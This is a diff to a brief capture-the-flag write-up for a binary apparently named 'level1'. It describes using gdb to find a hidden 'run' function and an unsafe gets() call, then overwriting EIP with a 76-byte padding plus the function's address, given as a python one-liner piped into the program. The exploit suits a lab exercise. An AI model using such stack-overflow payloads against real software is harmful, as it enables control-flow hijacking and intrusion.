@@ -1,5 +1,10 @@
 We disas the program with gdb and we check the fonction with info fun and we have a suspicious run fonction
-So we do a buffer overflow of 76 to write the adress of the tun fonction in eip register
+
+We see the usage of "gets()" which isn't a safe function so we search the offset where we can overwrite EIP register.
+
+So we found a buffer overflow at 76 to write the adress of the "run" fonction in EIP :
+
+We use python to be able to write \x characters for the address of "run" to STDIN :
 
 (python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1
 
